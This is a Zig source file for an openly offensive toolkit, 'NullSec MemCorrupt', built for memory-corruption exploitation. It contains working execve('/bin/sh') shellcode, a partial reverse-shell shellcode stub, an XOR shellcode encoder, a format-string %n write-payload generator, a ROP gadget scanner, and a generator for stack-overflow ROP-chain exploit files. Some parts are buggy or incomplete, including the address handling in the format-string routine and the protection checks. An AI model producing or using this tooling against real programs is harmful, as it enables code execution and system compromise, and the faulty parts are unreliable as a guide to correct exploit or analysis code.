// NullSec MemCorrupt - Memory Corruption Exploitation Toolkit
// Language: Zig
// Author: bad-antics
// License: NullSec Proprietary

const std = @import("std");
const fs = std.fs;
const mem = std.mem;
const fmt = std.fmt;
const io = std.io;
const process = std.process;

const VERSION = "1.0.0";

const BANNER =
    \\
    \\    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
    \\    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
    \\   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
    \\   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
    \\   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
    \\   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    \\   █░░░░░░░░░░░░░ M E M C O R R U P T ░░░░░░░░░░░░░░░░░░░░░░░█
    \\   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    \\                       bad-antics v
;

// ELF structures for parsing
const ElfHeader = extern struct {
    e_ident: [16]u8,
    e_type: u16,
    e_machine: u16,
    e_version: u32,
    e_entry: u64,
    e_phoff: u64,
    e_shoff: u64,
    e_flags: u32,
    e_ehsize: u16,
    e_phentsize: u16,
    e_phnum: u16,
    e_shentsize: u16,
    e_shnum: u16,
    e_shstrndx: u16,
};

const ProgramHeader = extern struct {
    p_type: u32,
    p_flags: u32,
    p_offset: u64,
    p_vaddr: u64,
    p_paddr: u64,
    p_filesz: u64,
    p_memsz: u64,
    p_align: u64,
};

const SectionHeader = extern struct {
    sh_name: u32,
    sh_type: u32,
    sh_flags: u64,
    sh_addr: u64,
    sh_offset: u64,
    sh_size: u64,
    sh_link: u32,
    sh_info: u32,
    sh_addralign: u64,
    sh_entsize: u64,
};

// Binary protection flags
const Protection = struct {
    nx: bool = false,
    pie: bool = false,
    relro: enum { none, partial, full } = .none,
    canary: bool = false,
    fortify: bool = false,
    rpath: bool = false,
    runpath: bool = false,
};

// Gadget representation
const Gadget = struct {
    address: u64,
    bytes: []const u8,
    disasm: []const u8,
    
    pub fn format(self: Gadget, allocator: std.mem.Allocator) ![]u8 {
        return try fmt.allocPrint(allocator, "0x{x:0>16}: {s}", .{ self.address, self.disasm });
    }
};

// ROP gadget patterns (x86_64)
const GadgetPatterns = struct {
    // ret
    const ret = [_]u8{0xc3};
    // pop rdi; ret
    const pop_rdi_ret = [_]u8{ 0x5f, 0xc3 };
    // pop rsi; ret
    const pop_rsi_ret = [_]u8{ 0x5e, 0xc3 };
    // pop rdx; ret
    const pop_rdx_ret = [_]u8{ 0x5a, 0xc3 };
    // pop rax; ret
    const pop_rax_ret = [_]u8{ 0x58, 0xc3 };
    // pop rbx; ret
    const pop_rbx_ret = [_]u8{ 0x5b, 0xc3 };
    // pop rcx; ret
    const pop_rcx_ret = [_]u8{ 0x59, 0xc3 };
    // pop rbp; ret
    const pop_rbp_ret = [_]u8{ 0x5d, 0xc3 };
    // pop rsp; ret
    const pop_rsp_ret = [_]u8{ 0x5c, 0xc3 };
    // syscall; ret
    const syscall_ret = [_]u8{ 0x0f, 0x05, 0xc3 };
    // syscall
    const syscall = [_]u8{ 0x0f, 0x05 };
    // leave; ret
    const leave_ret = [_]u8{ 0xc9, 0xc3 };
    // mov rdi, rax; ... ; ret patterns vary
};

// Shellcode templates
const Shellcode = struct {
    // Linux x86_64 execve("/bin/sh", NULL, NULL)
    pub const execve_binsh = [_]u8{
        0x48, 0x31, 0xf6, // xor rsi, rsi
        0x56, // push rsi
        0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, // movabs rdi, 0x68732f2f6e69622f
        0x57, // push rdi
        0x54, // push rsp
        0x5f, // pop rdi
        0x48, 0x31, 0xd2, // xor rdx, rdx
        0xb0, 0x3b, // mov al, 0x3b
        0x0f, 0x05, // syscall
    };

    // Reverse shell (placeholder - needs IP/port encoding)
    pub const reverse_shell_template = [_]u8{
        0x48, 0x31, 0xc0, // xor rax, rax
        0x48, 0x31, 0xff, // xor rdi, rdi
        0x48, 0x31, 0xf6, // xor rsi, rsi
        0x48, 0x31, 0xd2, // xor rdx, rdx
        // ... socket, connect, dup2, execve
    };

    // XOR encoder
    pub fn xor_encode(shellcode: []const u8, key: u8, allocator: std.mem.Allocator) ![]u8 {
        var encoded = try allocator.alloc(u8, shellcode.len);
        for (shellcode, 0..) |byte, i| {
            encoded[i] = byte ^ key;
        }
        return encoded;
    }
};

// Format string exploitation
const FormatString = struct {
    offset: usize,
    target_addr: u64,
    target_value: u64,

    pub fn calculate_writes(self: FormatString, allocator: std.mem.Allocator) ![]u8 {
        // Calculate format string payload for arbitrary write
        // Using %n to write byte-by-byte
        var payload = std.ArrayList(u8).init(allocator);
        const writer = payload.writer();

        // Write address to stack
        try writer.print("{s}", .{@as([*]const u8, @ptrFromInt(self.target_addr))[0..8]});

        // Calculate padding and writes
        const bytes = [_]u8{
            @truncate(self.target_value),
            @truncate(self.target_value >> 8),
            @truncate(self.target_value >> 16),
            @truncate(self.target_value >> 24),
        };

        var printed: usize = 8;
        for (bytes, 0..) |byte, i| {
            const to_print = (@as(usize, byte) + 256 - (printed % 256)) % 256;
            if (to_print > 0) {
                try writer.print("%{d}c", .{to_print});
                printed += to_print;
            }
            try writer.print("%{d}$hhn", .{self.offset + i});
        }

        return payload.toOwnedSlice();
    }
};

// Binary analysis
fn checksec(path: []const u8) !Protection {
    var prot = Protection{};

    const file = try fs.cwd().openFile(path, .{});
    defer file.close();

    var buf: [64]u8 = undefined;
    _ = try file.read(&buf);

    // Check ELF magic
    if (!mem.eql(u8, buf[0..4], "\x7fELF")) {
        return error.NotElfFile;
    }

    // Read ELF header
    try file.seekTo(0);
    const ehdr = try file.reader().readStruct(ElfHeader);

    // Check PIE
    if (ehdr.e_type == 3) { // ET_DYN
        prot.pie = true;
    }

    // Read program headers for NX and RELRO
    try file.seekTo(ehdr.e_phoff);
    var i: u16 = 0;
    while (i < ehdr.e_phnum) : (i += 1) {
        const phdr = try file.reader().readStruct(ProgramHeader);

        // GNU_STACK - check for NX
        if (phdr.p_type == 0x6474e551) {
            if (phdr.p_flags & 1 == 0) { // Not executable
                prot.nx = true;
            }
        }

        // GNU_RELRO
        if (phdr.p_type == 0x6474e552) {
            prot.relro = .partial;
        }
    }

    // TODO: Check for full RELRO (BIND_NOW), canary, FORTIFY

    return prot;
}

// Find gadgets in binary
fn findGadgets(path: []const u8, allocator: std.mem.Allocator) !std.ArrayList(Gadget) {
    var gadgets = std.ArrayList(Gadget).init(allocator);

    const file = try fs.cwd().openFile(path, .{});
    defer file.close();

    const stat = try file.stat();
    const data = try file.readToEndAlloc(allocator, stat.size);
    defer allocator.free(data);

    // Search for gadget patterns
    const patterns = [_]struct { bytes: []const u8, name: []const u8 }{
        .{ .bytes = &GadgetPatterns.pop_rdi_ret, .name = "pop rdi; ret" },
        .{ .bytes = &GadgetPatterns.pop_rsi_ret, .name = "pop rsi; ret" },
        .{ .bytes = &GadgetPatterns.pop_rdx_ret, .name = "pop rdx; ret" },
        .{ .bytes = &GadgetPatterns.pop_rax_ret, .name = "pop rax; ret" },
        .{ .bytes = &GadgetPatterns.syscall_ret, .name = "syscall; ret" },
        .{ .bytes = &GadgetPatterns.syscall, .name = "syscall" },
        .{ .bytes = &GadgetPatterns.leave_ret, .name = "leave; ret" },
        .{ .bytes = &GadgetPatterns.ret, .name = "ret" },
    };

    for (patterns) |pattern| {
        var offset: usize = 0;
        while (mem.indexOf(u8, data[offset..], pattern.bytes)) |idx| {
            const addr = offset + idx;
            try gadgets.append(Gadget{
                .address = addr,
                .bytes = pattern.bytes,
                .disasm = pattern.name,
            });
            offset = addr + 1;
        }
    }

    return gadgets;
}

// Generate exploit template
fn generateTemplate(exploit_type: []const u8, output: []const u8) !void {
    const template = if (mem.eql(u8, exploit_type, "stack_bof"))
        \\// NullSec Stack Buffer Overflow Exploit Template
        \\const std = @import("std");
        \\
        \\const TARGET = "./vulnerable";
        \\const OFFSET = 72;  // Offset to return address
        \\
        \\// Gadgets (update with actual addresses)
        \\const POP_RDI = 0x401234;
        \\const POP_RSI = 0x401235;
        \\const POP_RDX = 0x401236;
        \\const SYSCALL = 0x401237;
        \\const BINSH = 0x402000;
        \\
        \\pub fn main() !void {
        \\    var payload: [256]u8 = undefined;
        \\    var idx: usize = 0;
        \\    
        \\    // Padding
        \\    @memset(payload[0..OFFSET], 'A');
        \\    idx = OFFSET;
        \\    
        \\    // ROP Chain: execve("/bin/sh", NULL, NULL)
        \\    // rdi = pointer to "/bin/sh"
        \\    std.mem.writeInt(u64, payload[idx..][0..8], POP_RDI, .little);
        \\    idx += 8;
        \\    std.mem.writeInt(u64, payload[idx..][0..8], BINSH, .little);
        \\    idx += 8;
        \\    
        \\    // rsi = NULL
        \\    std.mem.writeInt(u64, payload[idx..][0..8], POP_RSI, .little);
        \\    idx += 8;
        \\    std.mem.writeInt(u64, payload[idx..][0..8], 0, .little);
        \\    idx += 8;
        \\    
        \\    // rdx = NULL
        \\    std.mem.writeInt(u64, payload[idx..][0..8], POP_RDX, .little);
        \\    idx += 8;
        \\    std.mem.writeInt(u64, payload[idx..][0..8], 0, .little);
        \\    idx += 8;
        \\    
        \\    // rax = 59 (execve syscall number)
        \\    // ... add pop rax gadget
        \\    
        \\    // syscall
        \\    std.mem.writeInt(u64, payload[idx..][0..8], SYSCALL, .little);
        \\    idx += 8;
        \\    
        \\    const stdout = std.io.getStdOut().writer();
        \\    try stdout.writeAll(payload[0..idx]);
        \\}
    else if (mem.eql(u8, exploit_type, "format_string"))
        \\// NullSec Format String Exploit Template
        \\const std = @import("std");
        \\
        \\const TARGET = "./vulnerable";
        \\const OFFSET = 6;  // Stack offset to controlled input
        \\const TARGET_ADDR = 0x404040;  // Address to overwrite
        \\const TARGET_VALUE = 0xdeadbeef;  // Value to write
        \\
        \\pub fn main() !void {
        \\    var payload: [256]u8 = undefined;
        \\    // Build format string payload
        \\    // ...
        \\}
    else
        \\// NullSec Generic Exploit Template
        \\const std = @import("std");
        \\
        \\pub fn main() !void {
        \\    // Add exploit logic
        \\}
    ;

    const file = try fs.cwd().createFile(output, .{});
    defer file.close();
    try file.writeAll(template);
}

// Print security protections
fn printProtections(prot: Protection) void {
    const stdout = io.getStdOut().writer();

    stdout.print("\n=== Binary Protections ===\n\n", .{}) catch {};

    const nx_status = if (prot.nx) "\x1b[32mEnabled\x1b[0m" else "\x1b[31mDisabled\x1b[0m";
    stdout.print("  NX:        {s}\n", .{nx_status}) catch {};

    const pie_status = if (prot.pie) "\x1b[32mEnabled\x1b[0m" else "\x1b[31mDisabled\x1b[0m";
    stdout.print("  PIE:       {s}\n", .{pie_status}) catch {};

    const relro_status = switch (prot.relro) {
        .full => "\x1b[32mFull\x1b[0m",
        .partial => "\x1b[33mPartial\x1b[0m",
        .none => "\x1b[31mNone\x1b[0m",
    };
    stdout.print("  RELRO:     {s}\n", .{relro_status}) catch {};

    const canary_status = if (prot.canary) "\x1b[32mEnabled\x1b[0m" else "\x1b[31mDisabled\x1b[0m";
    stdout.print("  Canary:    {s}\n", .{canary_status}) catch {};

    stdout.print("\n", .{}) catch {};
}

fn printUsage() void {
    const stdout = io.getStdOut().writer();
    stdout.print(
        \\
        \\USAGE:
        \\    memcorrupt <command> [options]
        \\
        \\COMMANDS:
        \\    gadgets     Find ROP/JOP gadgets in binary
        \\    checksec    Analyze binary protections
        \\    template    Generate exploit template
        \\    fmtstr      Format string calculator
        \\    shellcode   Generate/encode shellcode
        \\
        \\OPTIONS:
        \\    -f, --file      Target binary file
        \\    -t, --type      Exploit type (stack_bof, format_string, heap)
        \\    -o, --output    Output file
        \\    --offset        Format string offset
        \\    --target        Target address (hex)
        \\    --value         Value to write (hex)
        \\
        \\EXAMPLES:
        \\    memcorrupt gadgets -f ./vuln
        \\    memcorrupt checksec -f ./vuln
        \\    memcorrupt template -t stack_bof -o exploit.zig
        \\    memcorrupt fmtstr --offset 6 --target 0x404040 --value 0xdeadbeef
        \\
    , .{}) catch {};
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const stdout = io.getStdOut().writer();
    try stdout.print("{s}{s}\n", .{ BANNER, VERSION });

    var args = try process.argsWithAllocator(allocator);
    defer args.deinit();

    _ = args.skip(); // Skip program name

    const command = args.next() orelse {
        printUsage();
        return;
    };

    if (mem.eql(u8, command, "gadgets")) {
        var file_path: ?[]const u8 = null;

        while (args.next()) |arg| {
            if (mem.eql(u8, arg, "-f") or mem.eql(u8, arg, "--file")) {
                file_path = args.next();
            }
        }

        if (file_path) |path| {
            try stdout.print("[*] Searching for gadgets in: {s}\n\n", .{path});
            const gadgets = try findGadgets(path, allocator);
            defer gadgets.deinit();

            try stdout.print("=== Found {d} Gadgets ===\n\n", .{gadgets.items.len});
            for (gadgets.items) |gadget| {
                try stdout.print("  0x{x:0>8}: {s}\n", .{ gadget.address, gadget.disasm });
            }
        } else {
            try stdout.print("[!] Please specify a file with -f\n", .{});
        }
    } else if (mem.eql(u8, command, "checksec")) {
        var file_path: ?[]const u8 = null;

        while (args.next()) |arg| {
            if (mem.eql(u8, arg, "-f") or mem.eql(u8, arg, "--file")) {
                file_path = args.next();
            }
        }

        if (file_path) |path| {
            try stdout.print("[*] Analyzing: {s}\n", .{path});
            const prot = checksec(path) catch |err| {
                try stdout.print("[!] Error: {}\n", .{err});
                return;
            };
            printProtections(prot);
        } else {
            try stdout.print("[!] Please specify a file with -f\n", .{});
        }
    } else if (mem.eql(u8, command, "template")) {
        var exploit_type: []const u8 = "stack_bof";
        var output: []const u8 = "exploit.zig";

        while (args.next()) |arg| {
            if (mem.eql(u8, arg, "-t") or mem.eql(u8, arg, "--type")) {
                exploit_type = args.next() orelse "stack_bof";
            } else if (mem.eql(u8, arg, "-o") or mem.eql(u8, arg, "--output")) {
                output = args.next() orelse "exploit.zig";
            }
        }

        try generateTemplate(exploit_type, output);
        try stdout.print("[+] Template generated: {s}\n", .{output});
    } else if (mem.eql(u8, command, "shellcode")) {
        try stdout.print("[*] Available shellcodes:\n\n", .{});
        try stdout.print("  execve_binsh ({d} bytes):\n    ", .{Shellcode.execve_binsh.len});
        for (Shellcode.execve_binsh) |byte| {
            try stdout.print("\\x{x:0>2}", .{byte});
        }
        try stdout.print("\n\n", .{});
    } else if (mem.eql(u8, command, "-h") or mem.eql(u8, command, "--help")) {
        printUsage();
    } else {
        try stdout.print("[!] Unknown command: {s}\n", .{command});
        printUsage();
    }
}
